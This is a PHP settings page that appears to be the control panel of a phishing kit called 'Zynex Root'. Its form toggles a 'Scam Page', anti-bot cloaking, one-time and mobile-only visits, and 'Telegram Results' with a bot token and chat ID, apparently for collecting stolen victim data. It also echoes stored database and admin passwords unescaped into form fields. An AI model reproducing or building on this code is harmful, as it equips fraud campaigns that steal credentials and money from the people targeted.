<?php
require_once 'inc/config.php';  // Ensure these paths are correct
require_once 'inc/connect.php';

// Set default timezone
date_default_timezone_set('Europe/Dublin');

// Start session securely
if (session_status() !== PHP_SESSION_ACTIVE) {
    session_start();  // Start session only if not already started
}
$offlineVal = @file_get_contents("offline.txt");
$checked = ($offlineVal == '1') ? 'checked' : '';

// Add HTTP security headers
header('X-Frame-Options: DENY'); // Prevent clickjacking
header('X-Content-Type-Options: nosniff'); // Prevent MIME-type sniffing
header('X-XSS-Protection: 1; mode=block'); // Enable XSS filter in older browsers
header('Referrer-Policy: strict-origin-when-cross-origin'); // Control referrer header

// Check if the user is logged in
if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    header('Location: login.php');
    exit;
}

// Regenerate session ID to prevent session fixation attacks
if (!isset($_SESSION['regenerated'])) {
    session_regenerate_id(true);
    $_SESSION['regenerated'] = true;
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Zynex Root - Settings</title>

<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<link rel="stylesheet" href="https://unpkg.com/webkul-micron@1.1.6/dist/css/micron.min.css">
<link rel="stylesheet" href="css/toastr.min.css">

<link rel="stylesheet" href="css/flag-icon.css">
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700;800&display=swap" rel="stylesheet">
<link rel="icon" type="image/x-icon" href="img/favicon.ico">

<style>
:root{
  --primary:#6366f1; --primary-dark:#4f46e5; --secondary:#8b5cf6;
  --bg:#0f172a; --bg-2:#0b1220; --card:#0f172a; --border:#1f2937;
  --text:#fff; --text-2:#e5e7eb; --muted:#94a3b8;
  --shadow:0 12px 28px rgba(0,0,0,.35);
}
*{box-sizing:border-box}
html,body{height:100%}
body{font-family:'Inter',system-ui,Segoe UI,Roboto,Arial,sans-serif;background:var(--bg);color:var(--text);overflow-x:hidden}

/* ---------- Header ---------- */
.modern-header{
  background:#0b1220; border-bottom:1px solid var(--border);
  padding:16px 0; position:sticky; top:0; z-index:10;
}
.header-container{
  width:100%; max-width:none; padding:0 24px; margin:0 auto;
  display:flex; align-items:center; justify-content:space-between; gap:12px;
}
.logo-section img{width:56px;height:56px;border-radius:14px}

.user-menu{display:flex; gap:12px; align-items:center; flex-wrap:nowrap}
.user-menu .nav-link-modern{
  display:inline-flex; align-items:center; gap:.5rem;
  padding:.6rem 1rem; border:1px solid var(--border);
  border-radius:12px; background:var(--card); text-decoration:none;
  color:var(--text); font-weight:700; white-space:nowrap;
}
.user-menu .nav-link-modern:hover{background:var(--primary);border-color:var(--primary);color:#fff}

/* ---------- Layout ---------- */
.main-content{width:100%; padding:28px 24px}
.page-content{background:transparent}
.block{
  width:100%; max-width:none; margin:0 auto;
  background:var(--card); border:1px solid var(--border);
  border-radius:18px; box-shadow:var(--shadow); overflow:hidden;
}
.block:before{
  content:"Settings"; display:block;
  background:linear-gradient(135deg,var(--primary),var(--secondary));
  color:#fff; font-weight:800; padding:14px 20px;
}
.block-body{padding:24px}

/* ---------- Form ---------- */
.form-group{margin-bottom:16px}
.form-control-label{color:var(--text-2);font-weight:700}
.form-control{
  background:var(--bg-2); border:1px solid var(--border);
  color:#fff; border-radius:12px; padding:.9rem 1rem;
}
.form-control:focus{border-color:var(--primary);box-shadow:0 0 0 3px rgba(99,102,241,.25) inset;background:#0d1526}

/* Keep labels left / inputs right on desktop; stack on mobile */
.form-group.row>.col-sm-3{padding-right:10px}
.form-group.row>.col-sm-9{padding-left:10px}

/* ---------- Toggle tiles (no HTML change) ---------- */
.checkbox-container{
  display:grid;
  grid-template-columns:repeat(auto-fit, minmax(260px, 1fr));
  gap:14px;
}
.i-checks{
  display:flex; align-items:center; gap:12px;
  padding:14px; background:var(--bg-2);
  border:1px solid var(--border); border-radius:14px;
}
.i-checks input[type="checkbox"]{
  appearance:none; width:46px; height:26px; flex:0 0 46px;
  position:relative; border-radius:20px; outline:0;
  background:#1f2a3a; border:1px solid #243244;
}
.i-checks input[type="checkbox"]::after{
  content:""; position:absolute; top:3px; left:3px;
  width:20px; height:20px; border-radius:50%; background:#fff;
  transition:transform .18s ease;
}
.i-checks input[type="checkbox"]:checked{
  background:linear-gradient(135deg,var(--primary),var(--secondary)); border-color:transparent;
}
.i-checks input[type="checkbox"]:checked::after{transform:translateX(20px)}
.i-checks label{margin:0; color:var(--text-2); font-weight:700; line-height:1.2}

/* ---------- Buttons ---------- */
.btn-primary{
  background:linear-gradient(135deg,var(--primary),var(--primary-dark));
  border:none; border-radius:14px; padding:.9rem 1.3rem; font-weight:800;
}
.btn-primary:hover{filter:brightness(1.05);transform:translateY(-1px)}

/* ---------- Mobile polish ---------- */
@media (max-width: 992px){
  .user-menu{flex-wrap:wrap; justify-content:flex-end}
}
@media (max-width: 768px){
  .form-group.row{display:block}
  .form-group.row>.col-sm-3,
  .form-group.row>.col-sm-9{padding:0 !important; width:100%}
  .form-group.row>.col-sm-3{margin-bottom:6px}
  .checkbox-container{grid-template-columns:1fr}
  .user-menu{gap:8px}
}



/* Inline save status & toggle flash (UX) */
.save-pill{display:none;margin-left:8px;font-size:12px;font-weight:700;padding:2px 8px;border-radius:999px}
.save-pill.saving{background:#1f2937;color:#e5e7eb}
.save-pill.ok{background:#10b981;color:#0b1220}
.save-pill.err{background:#ef4444;color:#fff}
.i-checks.saving{box-shadow:0 0 0 3px rgba(99,102,241,.35) inset}
.i-checks.flash-ok{box-shadow:0 0 0 3px rgba(16,185,129,.45) inset}
</style>
</head>
<body>

<header class="modern-header">
  <div class="header-container">
    <div class="logo-section">
      <a href="index.php"><img src="logo.png" alt="logo"></a>
    </div>
    <div class="user-menu">
      <a class="nav-link-modern" href="index.php"><i class="fas fa-home"></i><span>Dashboard</span></a>
      <a class="nav-link-modern" href="crew.php"><i class="fas fa-users"></i><span>Crew</span></a>
      <a class="nav-link-modern" href="logout.php"><i class="fas fa-sign-out-alt"></i><span>Logout</span></a>
    </div>
  </div>
</header>

<div class="main-content">
  <div class="page-content">
    <section class="no-padding-bottom">
      <div class="col-lg-12">
        <div class="block">
          <div class="block-body">
            <form method="POST" action="set.php" class="form-horizontal">

              <div style="display:none" class="form-group row">
                <label class="col-sm-3 form-control-label">Database Host</label>
                <div class="col-sm-9"><input value="<?= $servername ?>" name="dbhost" type="text" class="form-control" required></div>
              </div>
              <div style="display:none" class="form-group row">
                <label class="col-sm-3 form-control-label">Database Name</label>
                <div class="col-sm-9"><input value="<?= $database ?>" name="dbname" type="text" class="form-control" required></div>
              </div>
              <div style="display:none" class="form-group row">
                <label class="col-sm-3 form-control-label">Database Username</label>
                <div class="col-sm-9"><input value="<?= $username ?>" name="dbuser" type="text" class="form-control" required></div>
              </div>
              <div style="display:none" class="form-group row">
                <label class="col-sm-3 form-control-label">Database Password</label>
                <div class="col-sm-9"><input value="<?= $password ?>" name="dbpass" type="password" class="form-control"></div>
              </div>

              <div class="form-group row">
                <label class="col-sm-3 form-control-label">Admin Username</label>
                <div class="col-sm-9"><input value="<?= $admin_panel_username ?>" name="adminuser" type="text" class="form-control" required></div>
              </div>
              <div class="form-group row">
                <label class="col-sm-3 form-control-label">Admin Password</label>
                <div class="col-sm-9"><input value="<?= $admin_panel_password ?>" name="adminpass" type="password" class="form-control" required></div>
              </div>
              <div class="form-group row">
                <label class="col-sm-3 form-control-label">Redirection Link</label>
                <div class="col-sm-9"><input value="<?= $exit_url ?>" name="extlink" type="url" class="form-control" required></div>
              </div>
              <div class="form-group row">
                <label class="col-sm-3 form-control-label">Telegram Chat Id</label>
                <div class="col-sm-9"><input value="<?= $telegram_chaid ?>" name="chatid" type="text" class="form-control"></div>
              </div>
              <div class="form-group row">
                <label class="col-sm-3 form-control-label">Telegram Bot Token</label>
                <div class="col-sm-9"><input value="<?= $bot_token ?>" name="bottoken" type="text" class="form-control"></div>
              </div>

              <div class="form-group row">
                <label class="col-sm-3 form-control-label">Config</label>
                <div class="col-sm-9">
                  <div class="checkbox-container">
                    <div class="i-checks">
                      <input type="checkbox" id="checkbox_state" name="checkbox_state" <?= $checked ?>>
                      <label for="checkbox_state">Activate Auto Mode</label>
                    </div>
                    <div class="i-checks">
                      <input name="gateway" id="checkbox1" type="checkbox" class="checkbox-template" <?= $enable_gateway ?>>
                      <label for="checkbox1">Activate Scam Page</label>
                    </div>
                    <div class="i-checks">
                      <input name="antibots" id="checkbox2" type="checkbox" class="checkbox-template" <?= $enable_antibots ?>>
                      <label for="checkbox2">Activate Antibots</label>
                    </div>
                    <div class="i-checks">
                      <input name="onetime" id="checkbox6" type="checkbox" class="checkbox-template" <?= $enable_onetime ?>>
                      <label for="checkbox6">Activate OneTime Visit</label>
                    </div>
                    <div class="i-checks">
                      <input name="moblock" id="checkbox8" type="checkbox" class="checkbox-template" <?= $mobile_lock ?>>
                      <label for="checkbox8">Activate Mobile Only</label>
                    </div>
                    <div class="i-checks">
                      <input name="notify" id="checkbox3" type="checkbox" class="checkbox-template" <?= $enable_telegram ?>>
                      <label for="checkbox3">Activate Telegram Results</label>
                    </div>
                  </div>
                </div>
              </div>

              <div class="form-group row">
                <div class="col-sm-9 ml-auto">
                  <button type="submit" class="btn btn-primary">Save changes</button>
                </div>
              </div>

            </form>
          </div><!-- /.block-body -->
        </div><!-- /.block -->
      </div>
    </section>
  </div>
</div>

    <script src="vendor/jquery/jquery.min.js"></script>
    <script src="vendor/popper.js/umd/popper.min.js"> </script>
    <script src="vendor/bootstrap/js/bootstrap.min.js"></script>
    <script src="vendor/jquery.cookie/jquery.cookie.js"> </script>
    <script src="vendor/jquery-validation/jquery.validate.min.js"></script>
    <script src="js/front.js"></script>
    <script src="js/toastr.min.js"></script>
    <script src="https://unpkg.com/webkul-micron@1.1.6/dist/script/micron.min.js"></script>
    <script src="js/other.js"></script>
	
	
<!-- GLOBAL TOASTR CONFIG (set ONCE, top-center) -->
<script>
toastr.options = {
  closeButton: true,
  progressBar: true,
  positionClass: "toast-top-center",
  preventDuplicates: true,
  newestOnTop: true,
  timeOut: 2200,
  extendedTimeOut: 1000,
  showDuration: 120,
  hideDuration: 120,
  showMethod: "fadeIn",
  hideMethod: "fadeOut"
};
</script>

<!-- AJAX SAVE + inline status (UNCHANGED logic; no second toastr.options here) -->
<script>
const $form = $('form[action="set.php"].form-horizontal');

// --- helpers for inline “Saved ✓” pill without changing HTML ---
function ensurePill($el){
  if ($el.next('.save-pill').length===0){
    $('<span class="save-pill" aria-live="polite"></span>').insertAfter($el);
  }
}
function setPill($el, text, mode){ // 'saving' | 'ok' | 'err'
  if (!$el || $el.length===0) return;
  ensurePill($el);
  const $p=$el.next('.save-pill');
  $p.text(text).removeClass('saving ok err').addClass(mode).fadeIn(120);
  if (mode==='ok'){ setTimeout(()=>{$p.fadeOut(180)}, 1100); }
}

let typingTimer=null, lastChanged=null;

// Save button -> AJAX (no refresh)
$form.on('submit', function(e){
  e.preventDefault();
  const $btn = $(this).find('button[type="submit"]');
  const orig = $btn.data('orig') || $btn.text();
  $btn.data('orig', orig).prop('disabled', true).text('Saving…');

  $.ajax({
    url: $form.attr('action'),
    type: 'POST',
    data: $form.serialize() + '&ajax=1',
    headers: { 'Accept': 'application/json' }
  })
  .done(function(resp){
    try{ resp = (typeof resp==='string') ? JSON.parse(resp) : resp; }catch(e){ resp = {}; }
    if (resp && resp.status==='success') {
      toastr.success(resp.message || 'Settings saved');

      // reflect server states if provided
      if (resp.states) {
        $('#checkbox_state').prop('checked', !!resp.states.checkbox_state);
        $('#checkbox1').prop('checked', !!resp.states.gateway);
        $('#checkbox2').prop('checked', !!resp.states.antibots);
        $('#checkbox6').prop('checked', !!resp.states.onetime);
        $('#checkbox8').prop('checked', !!resp.states.moblock);
        $('#checkbox3').prop('checked', !!resp.states.notify);
      }

      // inline success feedback
      if (lastChanged && lastChanged.length){
        if (lastChanged.is(':checkbox')){
          const $tile=lastChanged.closest('.i-checks').removeClass('saving').addClass('flash-ok');
          setTimeout(()=>{$tile.removeClass('flash-ok')}, 900);
        }else{
          setPill(lastChanged,'Saved ✓','ok');
        }
      }
      $btn.text('Saved ✓'); setTimeout(()=>{$btn.text(orig)}, 900);
    } else {
      toastr.error((resp && resp.message) ? resp.message : 'Failed to save');
      if (lastChanged && lastChanged.length && !lastChanged.is(':checkbox')){
        setPill(lastChanged,'Error','err');
      }
      $btn.text(orig);
    }
  })
  .fail(function(){
    toastr.error('Network error');
    if (lastChanged && lastChanged.length && !lastChanged.is(':checkbox')){
      setPill(lastChanged,'Error','err');
    }
    $btn.text(orig);
  })
  .always(function(){ $btn.prop('disabled', false); });
});

// Any toggle change -> auto-save
$('.checkbox-template, #checkbox_state').on('change', function(){
  lastChanged=$(this);
  $(this).closest('.i-checks').addClass('saving');
  $form.trigger('submit');
});

// Auto-save on inputs too (blur + typing debounce)
const $autosaveFields = $(
  'input[name="adminuser"], input[name="adminpass"], '+
  'input[name="extlink"], input[name="chatid"], input[name="bottoken"]'
);
$autosaveFields.on('input', function(){
  lastChanged=$(this);
  setPill(lastChanged,'Saving…','saving');
  clearTimeout(typingTimer);
  typingTimer=setTimeout(()=>{$form.trigger('submit')}, 800);
});
$autosaveFields.on('blur', function(){
  lastChanged=$(this);
  setPill(lastChanged,'Saving…','saving');
  $form.trigger('submit');
});
</script>

<!-- SINGLE toast print (leave this exactly once) -->
<?php
$toast = null;
if (!empty($_SESSION['toast']) && is_array($_SESSION['toast'])) {
    $toast = $_SESSION['toast']; $_SESSION['toast'] = null;
} elseif (!empty($_SESSION['update_settings'])) {
    $toast = ['type' => 'success', 'msg' => 'Settings updated successfully'];
    $_SESSION['update_settings'] = '';
}
if ($toast): ?>
<script>
toastr["<?= $toast['type'] ?>"]("<?= htmlspecialchars($toast['msg'], ENT_QUOTES) ?>");
</script>
<?php endif; ?>


</body>
</html>
